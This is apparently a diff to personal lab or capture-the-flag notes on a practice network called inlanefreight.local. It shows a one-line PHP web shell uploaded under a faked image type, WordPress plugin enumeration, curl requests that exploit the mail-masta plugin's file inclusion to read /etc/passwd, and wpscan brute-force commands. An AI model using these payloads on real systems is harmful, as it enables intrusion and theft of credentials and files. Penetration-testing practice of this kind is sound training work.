@@ -66,3 +66,35 @@ Then right clicking and `open in broswer`, I am met with a new page.
 Capturing the post request and changing the contents to `<?php system($_GET['cmd']); ?>` 
 Making the `Content-Type: img/png`
 Then `curl 'http://dev.inlanefregiht.local/uploads/shell.php?cmd=command'`.
+
+# IR.inlanefreight.local
+`curl -s http://ir.inlanefreight.local | grep WordPress`
+Getting the version of `6.0`
+Plugins
+```bash
+b2i-investor-tools
+mail-masta
+ | Location: http://ir.inlanefreight.local/wp-content/plugins/mail-masta/
+ | Latest Version: 1.0 (up to date)
+ | Last Updated: 2014-09-19 7:52am GMT (12 years ago)
+ | Readme: http://ir.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.0 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://ir.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt
+
+feed
+akismet
+```
+
+Knowing that `mail-masta` has multiple known plugin vulns.
+`curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`
+
+`curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/www/html/flag.txt`
+
+
+Another way
+`wpscan -e u -t 500 --url http://ir.inlanefreight.local`
+`wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp`
